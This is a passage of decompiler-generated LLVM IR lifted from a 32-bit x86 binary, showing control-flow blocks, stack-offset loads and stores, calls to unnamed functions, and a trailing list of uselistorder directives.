  br i1 %v2_8055882, label %dec_label_pc_805588e, label %dec_label_pc_8055884

dec_label_pc_8055884:                             ; preds = %dec_label_pc_8055884.lr.ph, %dec_label_pc_8055879
  %v0_8055884 = phi i32 [ %v0_8055884.pre, %dec_label_pc_8055884.lr.ph ], [ %v5_8055879, %dec_label_pc_8055879 ]
  %v0_805575a78 = phi i32 [ %v1_805587e.pre, %dec_label_pc_8055884.lr.ph ], [ %v1_8055879, %dec_label_pc_8055879 ]
  %v2_8055884 = add i32 %v0_805575a78, 16
  %v3_8055884 = inttoptr i32 %v2_8055884 to i32*
  %v4_8055884 = load i32, i32* %v3_8055884, align 4
  %v5_8055884 = sub i32 %v0_8055884, %v4_8055884
  %v11_8055884 = xor i32 %v4_8055884, %v0_8055884
  %v12_8055884 = xor i32 %v5_8055884, %v0_8055884
  %v13_8055884 = and i32 %v12_8055884, %v11_8055884
  %v14_8055884 = icmp slt i32 %v13_8055884, 0
  %v16_8055884 = icmp slt i32 %v5_8055884, 0
  %v2_8055888 = icmp eq i1 %v16_8055884, %v14_8055884
  br i1 %v2_8055888, label %dec_label_pc_805588e, label %dec_label_pc_805575a

dec_label_pc_805588e:                             ; preds = %dec_label_pc_805577d, %dec_label_pc_805574e, %dec_label_pc_8055879, %dec_label_pc_80557cf, %dec_label_pc_80557e3, %dec_label_pc_8055884, %dec_label_pc_8055806.dec_label_pc_805588e.loopexit_crit_edge
  %v0_805588e = phi i32 [ %v0_805588e.pre.pre, %dec_label_pc_8055806.dec_label_pc_805588e.loopexit_crit_edge ], [ %v1_805587e.pre, %dec_label_pc_805574e ], [ %v1_8055879, %dec_label_pc_8055879 ], [ %v1_80557c7, %dec_label_pc_80557cf ], [ %v1_80557c7, %dec_label_pc_80557e3 ], [ %v0_805575a78, %dec_label_pc_8055884 ], [ %v1_805576e, %dec_label_pc_805577d ]
  %v1_8055891 = add i32 %v0_805588e, 20
  %v2_8055891 = inttoptr i32 %v1_8055891 to i32*
  %v3_8055891 = load i32, i32* %v2_8055891, align 4
  %v5_8055891 = add i32 %v0_805588e, -16
  %v6_8055891 = inttoptr i32 %v5_8055891 to i32*
  store i32 %v3_8055891, i32* %v6_8055891, align 4
  %v1_8055895 = call i32 @function_8050b60(i32 -1)
  store i32 %v1_8055895, i32* %eax.global-to-local, align 4
  %v0_805589a = load i32, i32* @esp, align 4
  %v1_805589d = add i32 %v0_805589a, 272
  %v2_805589d = inttoptr i32 %v1_805589d to i32*
  %v3_805589d = load i32, i32* %v2_805589d, align 4
  %v4_805589d = icmp eq i32 %v3_805589d, 0
  br i1 %v4_805589d, label %dec_label_pc_80558b2, label %dec_label_pc_80558a7

dec_label_pc_80558a7:                             ; preds = %dec_label_pc_805588e
  store i32 %v3_805589d, i32* %edx.global-to-local, align 4
  %v2_80558ae = inttoptr i32 %v3_805589d to i32*
  store i32 %v1_805531e, i32* %v2_80558ae, align 4
  %v0_80558be.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80558be

dec_label_pc_80558b2:                             ; preds = %dec_label_pc_805588e
  %v3_80558b5 = inttoptr i32 %v0_805589a to i32*
  store i32 %v1_805531e, i32* %v3_80558b5, align 4
  %v1_80558b6 = call i32 @function_8053391(i32 -1)
  store i32 %v1_80558b6, i32* %eax.global-to-local, align 4
  %v0_80558bb = load i32, i32* @esp, align 4
  %v1_80558bb = add i32 %v0_80558bb, 16
  br label %dec_label_pc_80558be

dec_label_pc_80558be:                             ; preds = %dec_label_pc_80558a7, %dec_label_pc_80558b2
  %v0_80558be = phi i32 [ %v0_80558be.pre, %dec_label_pc_80558a7 ], [ %v1_80558bb, %dec_label_pc_80558b2 ]
  %v1_80558c1 = add i32 %v0_80558be, 12
  %v2_80558c1 = inttoptr i32 %v1_80558c1 to i32*
  %v3_80558c1 = load i32, i32* %v2_80558c1, align 4
  %v5_80558c1 = add i32 %v0_80558be, -16
  %v6_80558c1 = inttoptr i32 %v5_80558c1 to i32*
  store i32 %v3_80558c1, i32* %v6_80558c1, align 4
  %v1_80558c5 = call i32 @function_8053391(i32 -1)
  store i32 %v1_80558c5, i32* @eax, align 4
  %v0_80558ca = load i32, i32* @esp, align 4
  %v1_80558cd = add i32 %v0_80558ca, 8
  %v2_80558cd = inttoptr i32 %v1_80558cd to i32*
  store i32 ptrtoint (i32* @global_var_8064b28.399 to i32), i32* %v2_80558cd, align 4
  %v1_80558d2 = add i32 %v0_80558ca, 4
  %v2_80558d2 = inttoptr i32 %v1_80558d2 to i32*
  store i32 134561879, i32* %v2_80558d2, align 4
  %v1_80558d7 = add i32 %v0_80558ca, 200
  store i32 %v1_80558d7, i32* %ebx.global-to-local, align 4
  %v3_80558de = inttoptr i32 %v0_80558ca to i32*
  store i32 %v1_80558d7, i32* %v3_80558de, align 4
  %v2_80558df = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_80558df, i32* %eax.global-to-local, align 4
  %v0_80558e4 = load i32, i32* @esp, align 4
  %v1_80558e4 = inttoptr i32 %v0_80558e4 to i32*
  store i32 ptrtoint (i32* @global_var_8064b28.399 to i32), i32* %v1_80558e4, align 4
  %v1_80558eb = call i32 @function_8054057(i32 -1)
  store i32 %v1_80558eb, i32* %eax.global-to-local, align 4
  %v0_80558f0 = load i32, i32* @esp, align 4
  %v1_80558f0 = add i32 %v0_80558f0, 56
  %v2_80558f0 = inttoptr i32 %v1_80558f0 to i32*
  %v3_80558f0 = load i32, i32* %v2_80558f0, align 4
  store i32 %v3_80558f0, i32* @eax, align 4
  %v1_80558f4 = add i32 %v0_80558f0, 60
  %v2_80558f4 = inttoptr i32 %v1_80558f4 to i32*
  %v3_80558f4 = load i32, i32* %v2_80558f4, align 4
  store i32 %v3_80558f4, i32* %edx.global-to-local, align 4
  %v1_80558f8 = inttoptr i32 %v0_80558f0 to i32*
  %v3_80558f8 = add i32 %v0_80558f0, 4
  %v1_80558f9 = inttoptr i32 %v3_80558f8 to i32*
  %v1_80558fa = sext i32 %v3_80558f0 to i64
  store i64 %v1_80558fa, i64* @global_var_8064b40.400, align 64
  %v1_80558ff = trunc i32 %v3_80558f4 to i16
  store i16 %v1_80558ff, i16* @global_var_805e884.401, align 4
  store i32 1, i32* %v1_80558f9, align 4
  %v0_8055908 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055908, i32* %v1_80558f8, align 4
  %v2_8055909 = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_8055909, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a4a

dec_label_pc_8055913:                             ; preds = %dec_label_pc_805584d
  %v1_8055916 = inttoptr i32 %v0_805584d to i32*
  %v2_8055916 = load i32, i32* %v1_8055916, align 4
  %v5_8055916 = inttoptr i32 %v0_805583d to i32*
  store i32 %v2_8055916, i32* %v5_8055916, align 4
  %v1_8055918 = call i32 @function_8053391(i32 -1)
  store i32 %v1_8055918, i32* @eax, align 4
  %v0_805591d = load i32, i32* @esp, align 4
  %v1_805591d = add i32 %v0_805591d, 16
  br label %dec_label_pc_8055920

dec_label_pc_8055920:                             ; preds = %dec_label_pc_8055652, %dec_label_pc_805577d, %dec_label_pc_8055775, %dec_label_pc_8055711, %dec_label_pc_8055697, %dec_label_pc_8055673, %dec_label_pc_8055913
  %v1_8055927 = phi i32 [ %v1_8055667, %dec_label_pc_8055652 ], [ %v1_805576e, %dec_label_pc_805577d ], [ %v1_805576e, %dec_label_pc_8055775 ], [ %v1_8055688, %dec_label_pc_8055711 ], [ %v1_8055688, %dec_label_pc_8055697 ], [ %v1_8055688, %dec_label_pc_8055673 ], [ %v1_805591d, %dec_label_pc_8055913 ]
  %v1_8055920 = add i32 %v1_8055927, 51
  %v2_8055920 = inttoptr i32 %v1_8055920 to i8*
  %v3_8055920 = load i8, i8* %v2_8055920, align 1
  %v4_8055920 = icmp eq i8 %v3_8055920, 0
  %v1_8055925 = icmp eq i1 %v4_8055920, false
  br i1 %v1_8055925, label %dec_label_pc_805596b, label %dec_label_pc_8055927

dec_label_pc_8055927:                             ; preds = %dec_label_pc_8055920
  %v0_8055927 = load i32, i32* @ecx, align 4
  %v2_8055927 = add i32 %v1_8055927, -4
  %v3_8055927 = inttoptr i32 %v2_8055927 to i32*
  store i32 %v0_8055927, i32* %v3_8055927, align 4
  %v1_8055928 = add i32 %v1_8055927, -8
  %v2_8055928 = inttoptr i32 %v1_8055928 to i32*
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %v2_8055928, align 4
  %v1_805592d = add i32 %v1_8055927, -12
  %v2_805592d = inttoptr i32 %v1_805592d to i32*
  store i32 134561879, i32* %v2_805592d, align 4
  %v1_8055932 = add i32 %v1_8055927, 184
  store i32 %v1_8055932, i32* @esi, align 4
  %v2_8055939 = add i32 %v1_8055927, -16
  %v3_8055939 = inttoptr i32 %v2_8055939 to i32*
  store i32 %v1_8055932, i32* %v3_8055939, align 4
  %v2_805593a = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_805593a, i32* %eax.global-to-local, align 4
  %v0_805593f = load i32, i32* @esp, align 4
  %v1_805593f = inttoptr i32 %v0_805593f to i32*
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %v1_805593f, align 4
  %v1_8055946 = call i32 @function_8054057(i32 -1)
  store i32 %v1_8055946, i32* %eax.global-to-local, align 4
  %v0_805594b = load i32, i32* @global_var_8064f78.402, align 8
  store i32 %v0_805594b, i32* %ebx.global-to-local, align 4
  %v0_8055951 = load i32, i32* @esp, align 4
  %v1_8055951 = inttoptr i32 %v0_8055951 to i32*
  %v2_8055951 = load i32, i32* %v1_8055951, align 4
  store i32 %v2_8055951, i32* @eax, align 4
  %v3_8055951 = add i32 %v0_8055951, 4
  %v1_8055952 = inttoptr i32 %v3_8055951 to i32*
  %v2_8055952 = load i32, i32* %v1_8055952, align 4
  store i32 %v2_8055952, i32* %edx.global-to-local, align 4
  %v1_8055953 = add i32 %v0_805594b, -1
  store i32 %v1_8055953, i32* @ebx, align 4
  store i32 1, i32* %v1_8055952, align 4
  %v0_8055956 = load i32, i32* @esi, align 4
  store i32 %v0_8055956, i32* %v1_8055951, align 4
  %v2_8055957 = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_8055957, i32* %eax.global-to-local, align 4
  %v0_805595c = load i32, i32* @esp, align 4
  %v1_805595c = add i32 %v0_805595c, 16
  %v1_805595f = add i32 %v0_805595c, 52
  %v2_805595f = inttoptr i32 %v1_805595f to i32*
  %v3_805595f = load i32, i32* %v2_805595f, align 4
  %v4_805595f = load i32, i32* @ebx, align 4
  %v5_805595f = sub i32 %v3_805595f, %v4_805595f
  %v11_805595f = xor i32 %v4_805595f, %v3_805595f
  %v12_805595f = xor i32 %v5_805595f, %v3_805595f
  %v13_805595f = and i32 %v12_805595f, %v11_805595f
  %v14_805595f = icmp slt i32 %v13_805595f, 0
  %v16_805595f = icmp slt i32 %v5_805595f, 0
  %v2_8055963 = icmp eq i1 %v16_805595f, %v14_805595f
  br i1 %v2_8055963, label %dec_label_pc_805596b, label %dec_label_pc_8055965

dec_label_pc_8055965:                             ; preds = %dec_label_pc_8055927
  %v4_8055965 = add i32 %v3_805595f, 1
  store i32 %v4_8055965, i32* %v2_805595f, align 4
  br label %dec_label_pc_805598c.backedge

dec_label_pc_805596b:                             ; preds = %dec_label_pc_80555f4, %dec_label_pc_8055927, %dec_label_pc_8055920, %dec_label_pc_805560b
  %v1_805597a = phi i32 [ %v1_805595c, %dec_label_pc_8055927 ], [ %v1_8055927, %dec_label_pc_8055920 ], [ %v1_8055647, %dec_label_pc_805560b ], [ %v0_805596b.pre, %dec_label_pc_80555f4 ]
  %v1_805596b = add i32 %v1_805597a, 40
  %v2_805596b = inttoptr i32 %v1_805596b to i32*
  %v3_805596b = load i32, i32* %v2_805596b, align 4
  %v1_805596f = add i32 %v3_805596b, 1
  store i32 %v1_805596f, i32* %eax.global-to-local, align 4
  %v1_8055970 = ashr i32 %v1_805596f, 31
  store i32 %v1_8055970, i32* %edx.global-to-local, align 4
  %v1_8055971 = add i32 %v1_805597a, 248
  %v2_8055971 = inttoptr i32 %v1_8055971 to i32*
  %v3_8055971 = load i32, i32* %v2_8055971, align 4
  %v5_8055971 = zext i32 %v1_805596f to i64
  %v7_8055971 = zext i32 %v1_8055970 to i64
  %v8_8055971 = mul nuw i64 %v7_8055971, 4294967296
  %v9_8055971 = or i64 %v8_8055971, %v5_8055971
  %v10_8055971 = zext i32 %v3_8055971 to i64
  %v11_8055971 = sdiv i64 %v9_8055971, %v10_8055971
  %v12_8055971 = trunc i64 %v11_8055971 to i32
  store i32 %v12_8055971, i32* %eax.global-to-local, align 4
  %v13_8055971 = srem i64 %v9_8055971, %v10_8055971
  %v14_8055971 = trunc i64 %v13_8055971 to i32
  store i32 %v14_8055971, i32* %edx.global-to-local, align 4
  %v1_8055978 = icmp eq i32 %v14_8055971, 0
  store i32 %v14_8055971, i32* %v2_805596b, align 4
  %v1_805597e = icmp eq i1 %v1_8055978, false
  br i1 %v1_805597e, label %dec_label_pc_8055984, label %dec_label_pc_8055980

dec_label_pc_8055980:                             ; preds = %dec_label_pc_805596b
  %v0_8055980 = load i32, i32* @esp, align 4
  %v1_8055980 = add i32 %v0_8055980, 28
  %v2_8055980 = inttoptr i32 %v1_8055980 to i32*
  %v3_8055980 = load i32, i32* %v2_8055980, align 4
  %v4_8055980 = add i32 %v3_8055980, 1
  store i32 %v4_8055980, i32* %v2_8055980, align 4
  br label %dec_label_pc_8055984

dec_label_pc_8055984:                             ; preds = %dec_label_pc_805596b, %dec_label_pc_8055980
  %v0_8055984 = load i32, i32* @esp, align 4
  %v1_8055984 = add i32 %v0_8055984, 36
  %v2_8055984 = inttoptr i32 %v1_8055984 to i32*
  store i32 -1, i32* %v2_8055984, align 4
  br label %dec_label_pc_805598c.backedge

dec_label_pc_805598c.backedge:                    ; preds = %dec_label_pc_8055984, %dec_label_pc_8055602, %dec_label_pc_80556f0, %dec_label_pc_8055965
  %v0_805598c.pre = load i32, i32* @esp, align 4
  %v1_805598c = add i32 %v0_805598c.pre, 28
  %v2_805598c = inttoptr i32 %v1_805598c to i32*
  %v3_805598c = load i32, i32* %v2_805598c, align 4
  %tmp122 = icmp ult i32 %v3_805598c, 3
  br i1 %tmp122, label %dec_label_pc_80553ec, label %dec_label_pc_80559b1

dec_label_pc_80559b1:                             ; preds = %dec_label_pc_8055366, %dec_label_pc_8055402, %dec_label_pc_80554f6, %dec_label_pc_805598c.backedge, %dec_label_pc_8055308, %dec_label_pc_8055340, %dec_label_pc_8055348, %dec_label_pc_8055356
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8055356 ], [ -1, %dec_label_pc_8055348 ], [ -1, %dec_label_pc_8055340 ], [ -1, %dec_label_pc_8055308 ], [ %v0_80553b3, %dec_label_pc_805598c.backedge ], [ %v0_80553b3, %dec_label_pc_80554f6 ], [ %v0_80553b3, %dec_label_pc_8055402 ], [ %v0_80553b3, %dec_label_pc_8055366 ]
  %v0_80559b1 = call i32 @function_8054608()
  store i32 %v0_80559b1, i32* %eax.global-to-local, align 4
  %v1_80559b6 = inttoptr i32 %v0_80559b1 to i32*
  store i32 -1, i32* %v1_80559b6, align 4
  %v0_80559bc = load i32, i32* @esp, align 4
  %v1_80559bc = add i32 %v0_80559bc, 56
  %v2_80559bc = inttoptr i32 %v1_80559bc to i32*
  %v3_80559bc = load i32, i32* %v2_80559bc, align 4
  store i32 %v3_80559bc, i32* %eax.global-to-local, align 4
  %v2_80559c0 = add i32 %v0_80559bc, 44
  %v3_80559c0 = inttoptr i32 %v2_80559c0 to i32*
  store i32 %v3_80559bc, i32* %v3_80559c0, align 4
  br label %dec_label_pc_80559c4

dec_label_pc_80559c4:                             ; preds = %dec_label_pc_8055729, %dec_label_pc_8055701, %dec_label_pc_80559b1
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_80559b1 ], [ %v0_80553b3, %dec_label_pc_8055729 ], [ %v0_80553b3, %dec_label_pc_8055701 ]
  %v0_80559c4 = load i32, i32* @esp, align 4
  %v1_80559c4 = add i32 %v0_80559c4, 20
  %v2_80559c4 = inttoptr i32 %v1_80559c4 to i32*
  %v3_80559c4 = load i32, i32* %v2_80559c4, align 4
  %v13_80559c4 = icmp eq i32 %v3_80559c4, -1
  br i1 %v13_80559c4, label %dec_label_pc_80559c4.dec_label_pc_80559da_crit_edge, label %dec_label_pc_80559cb

dec_label_pc_80559c4.dec_label_pc_80559da_crit_edge: ; preds = %dec_label_pc_80559c4
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_80559da

dec_label_pc_80559cb:                             ; preds = %dec_label_pc_80559c4
  %v3_80559ce = load i32, i32* %v2_80559c4, align 4
  %v5_80559ce = add i32 %v0_80559c4, -16
  %v6_80559ce = inttoptr i32 %v5_80559ce to i32*
  store i32 %v3_80559ce, i32* %v6_80559ce, align 4
  %v1_80559d2 = sext i16 %stack_var_-180.1 to i32
  %v2_80559d2 = call i32 @function_8050b60(i32 %v1_80559d2)
  store i32 %v2_80559d2, i32* %eax.global-to-local, align 4
  %v0_80559d7 = load i32, i32* @esp, align 4
  %v1_80559d7 = add i32 %v0_80559d7, 16
  br label %dec_label_pc_80559da

dec_label_pc_80559da:                             ; preds = %dec_label_pc_80559c4.dec_label_pc_80559da_crit_edge, %dec_label_pc_80559cb
  %v1_80559e1.pre-phi = phi i32 [ %.pre, %dec_label_pc_80559c4.dec_label_pc_80559da_crit_edge ], [ %v1_80559d2, %dec_label_pc_80559cb ]
  %v0_80559da = phi i32 [ %v0_80559c4, %dec_label_pc_80559c4.dec_label_pc_80559da_crit_edge ], [ %v1_80559d7, %dec_label_pc_80559cb ]
  %v1_80559dd = add i32 %v0_80559da, 12
  %v2_80559dd = inttoptr i32 %v1_80559dd to i32*
  %v3_80559dd = load i32, i32* %v2_80559dd, align 4
  %v5_80559dd = add i32 %v0_80559da, -16
  %v6_80559dd = inttoptr i32 %v5_80559dd to i32*
  store i32 %v3_80559dd, i32* %v6_80559dd, align 4
  %v2_80559e1 = call i32 @function_8053391(i32 %v1_80559e1.pre-phi)
  store i32 %v2_80559e1, i32* %eax.global-to-local, align 4
  %v1_80559e6 = load i32, i32* @esp, align 4
  %v2_80559e6 = inttoptr i32 %v1_80559e6 to i32*
  store i32 %v1_805531e, i32* %v2_80559e6, align 4
  %v2_80559e9 = call i32 @function_8053391(i32 %v1_80559e1.pre-phi)
  store i32 %v2_80559e9, i32* @eax, align 4
  %v0_80559ee = load i32, i32* @esp, align 4
  %v1_80559f1 = add i32 %v0_80559ee, 56
  %v2_80559f1 = inttoptr i32 %v1_80559f1 to i32*
  %v3_80559f1 = load i32, i32* %v2_80559f1, align 4
  %v13_80559f1 = icmp eq i32 %v3_80559f1, -1
  %v1_80559f6 = add i32 %v0_80559ee, 32
  %v2_80559f6 = inttoptr i32 %v1_80559f6 to i32*
  store i32 -1, i32* %v2_80559f6, align 4
  br i1 %v13_80559f1, label %dec_label_pc_80559da.dec_label_pc_8055a4d_crit_edge, label %dec_label_pc_8055a00

dec_label_pc_80559da.dec_label_pc_8055a4d_crit_edge: ; preds = %dec_label_pc_80559da
  %v0_8055a4d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055a4d

dec_label_pc_8055a00:                             ; preds = %dec_label_pc_80559da
  %v0_8055a00 = load i32, i32* @ecx, align 4
  %v1_8055a00 = load i32, i32* @esp, align 4
  %v2_8055a00 = add i32 %v1_8055a00, -4
  %v3_8055a00 = inttoptr i32 %v2_8055a00 to i32*
  store i32 %v0_8055a00, i32* %v3_8055a00, align 4
  %v1_8055a01 = add i32 %v1_8055a00, -8
  %v2_8055a01 = inttoptr i32 %v1_8055a01 to i32*
  store i32 ptrtoint (i32* @global_var_8064b28.399 to i32), i32* %v2_8055a01, align 4
  %v1_8055a06 = add i32 %v1_8055a00, -12
  %v2_8055a06 = inttoptr i32 %v1_8055a06 to i32*
  store i32 134561879, i32* %v2_8055a06, align 4
  %v1_8055a0b = add i32 %v1_8055a00, 184
  store i32 %v1_8055a0b, i32* %ebx.global-to-local, align 4
  %v2_8055a12 = add i32 %v1_8055a00, -16
  %v3_8055a12 = inttoptr i32 %v2_8055a12 to i32*
  store i32 %v1_8055a0b, i32* %v3_8055a12, align 4
  %v3_8055a13 = call i32 @function_805405a(i32 %v1_80559e1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055a13, i32* %eax.global-to-local, align 4
  %v0_8055a18 = load i32, i32* @esp, align 4
  %v1_8055a18 = inttoptr i32 %v0_8055a18 to i32*
  store i32 ptrtoint (i32* @global_var_8064b28.399 to i32), i32* %v1_8055a18, align 4
  %v2_8055a1f = call i32 @function_8054057(i32 %v1_80559e1.pre-phi)
  store i32 %v2_8055a1f, i32* %eax.global-to-local, align 4
  %v0_8055a24 = load i32, i32* @esp, align 4
  %v1_8055a24 = add i32 %v0_8055a24, 60
  %v2_8055a24 = inttoptr i32 %v1_8055a24 to i32*
  %v3_8055a24 = load i32, i32* %v2_8055a24, align 4
  store i32 %v3_8055a24, i32* %eax.global-to-local, align 4
  %v1_8055a28 = add i32 %v0_8055a24, 56
  %v2_8055a28 = inttoptr i32 %v1_8055a28 to i32*
  %v3_8055a28 = load i32, i32* %v2_8055a28, align 4
  store i32 %v3_8055a28, i32* %edx.global-to-local, align 4
  %v1_8055a2c = trunc i32 %v3_8055a24 to i16
  store i16 %v1_8055a2c, i16* @global_var_805e884.401, align 4
  %v1_8055a32 = inttoptr i32 %v0_8055a24 to i32*
  %v2_8055a32 = load i32, i32* %v1_8055a32, align 4
  store i32 %v2_8055a32, i32* @eax, align 4
  %v3_8055a32 = add i32 %v0_8055a24, 4
  %v1_8055a33 = sext i32 %v3_8055a28 to i64
  store i64 %v1_8055a33, i64* @global_var_8064b40.400, align 64
  %v1_8055a39 = inttoptr i32 %v3_8055a32 to i32*
  %v2_8055a39 = load i32, i32* %v1_8055a39, align 4
  store i32 %v2_8055a39, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8055a39, align 4
  %v0_8055a3c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055a3c, i32* %v1_8055a32, align 4
  %v3_8055a3d = call i32 @function_805405a(i32 %v1_80559e1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055a3d, i32* %eax.global-to-local, align 4
  %v0_8055a42 = load i32, i32* @esp, align 4
  %v1_8055a42 = add i32 %v0_8055a42, 32
  %v2_8055a42 = inttoptr i32 %v1_8055a42 to i32*
  store i32 -1, i32* %v2_8055a42, align 4
  br label %dec_label_pc_8055a4a

dec_label_pc_8055a4a:                             ; preds = %dec_label_pc_80558be, %dec_label_pc_8055a00
  %v0_8055a4a = load i32, i32* @esp, align 4
  %v1_8055a4a = add i32 %v0_8055a4a, 16
  br label %dec_label_pc_8055a4d

dec_label_pc_8055a4d:                             ; preds = %dec_label_pc_80559da.dec_label_pc_8055a4d_crit_edge, %dec_label_pc_8055a4a
  %v0_8055a4d = phi i32 [ %v0_8055a4d.pre, %dec_label_pc_80559da.dec_label_pc_8055a4d_crit_edge ], [ %v1_8055a4a, %dec_label_pc_8055a4a ]
  %v1_8055a4d = add i32 %v0_8055a4d, 16
  %v2_8055a4d = inttoptr i32 %v1_8055a4d to i32*
  %v3_8055a4d = load i32, i32* %v2_8055a4d, align 4
  store i32 %v3_8055a4d, i32* %eax.global-to-local, align 4
  %v1_8055a51 = add i32 %v0_8055a4d, 220
  %v1_8055a57 = inttoptr i32 %v1_8055a51 to i32*
  %v2_8055a57 = load i32, i32* %v1_8055a57, align 4
  store i32 %v2_8055a57, i32* @ebx, align 4
  %v3_8055a57 = add i32 %v0_8055a4d, 224
  %v1_8055a58 = inttoptr i32 %v3_8055a57 to i32*
  %v2_8055a58 = load i32, i32* %v1_8055a58, align 4
  store i32 %v2_8055a58, i32* @esi, align 4
  %v3_8055a58 = add i32 %v0_8055a4d, 228
  %v1_8055a59 = inttoptr i32 %v3_8055a58 to i32*
  %v2_8055a59 = load i32, i32* %v1_8055a59, align 4
  store i32 %v2_8055a59, i32* @edi, align 4
  %v3_8055a59 = add i32 %v0_8055a4d, 232
  %v1_8055a5a = inttoptr i32 %v3_8055a59 to i32*
  %v2_8055a5a = load i32, i32* %v1_8055a5a, align 4
  store i32 %v2_8055a5a, i32* @ebp, align 4
  ret i32 %v3_8055a4d

; uselistorder directives
  uselistorder i32 %v0_8055a4d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055a24, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80559da, { 1, 0 }
  uselistorder i32 %v1_80559e1.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_805598c.pre, { 1, 0 }
  uselistorder i32 %v5_805595f, { 1, 0 }
  uselistorder i32 %v3_805595f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8055927, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_80558f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80558be, { 1, 0 }
  uselistorder i32 %v3_805589d, { 1, 0, 2 }
  uselistorder i32 %v0_805588e, { 1, 0 }
  uselistorder i32 %v5_8055884, { 1, 0 }
  uselistorder i32* %v3_8055884, { 1, 0 }
  uselistorder i32 %v0_805575a78, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8055884, { 2, 1, 0 }
  uselistorder i32 %v5_805587e, { 1, 0 }
  uselistorder i32 %v1_805587d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8055879, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805583d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8055817, { 1, 0 }
  uselistorder i32 %v1_8055808, { 1, 0 }
  uselistorder i32 %v3_80557d9, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80557c7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_805576e, { 1, 2, 0 }
  uselistorder i32 %v0_805576e, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8055748, { 1, 0 }
  uselistorder i32 %v0_8055748.pre, { 2, 1, 0 }
  uselistorder i32 %v0_805573e, { 1, 2, 0 }
  uselistorder i32 %v0_805575066, { 3, 2, 1, 0 }
  uselistorder i32 %v5_805574857, { 1, 0 }
  uselistorder i32 %v5_80556ea, { 1, 0 }
  uselistorder i32* %v2_80556ea, { 1, 0, 2 }
  uselistorder i32 %v3_80556a2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8055688, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8055688, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8055667, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055647, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80555ed, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80555d2, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80555bb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055543, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80554f6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80554d7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80554bb, { 1, 0 }
  uselistorder i32 %v3_80554b0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80554ad, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8055452, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_805544d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8055436, { 1, 0 }
  uselistorder i32 %v1_8055402, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80553f395, { 2, 1, 0 }
  uselistorder i16 %v0_80553b3, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_80553ac, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805538d, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_8055356, { 1, 0, 2 }
  uselistorder i32 %v1_805531e, { 4, 2, 6, 1, 3, 10, 11, 8, 0, 9, 5, 7, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 69, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 51, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 4, 2, 3, 0 }
  uselistorder i32 100, { 1, 3, 4, 2, 0 }
  uselistorder i32 68, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
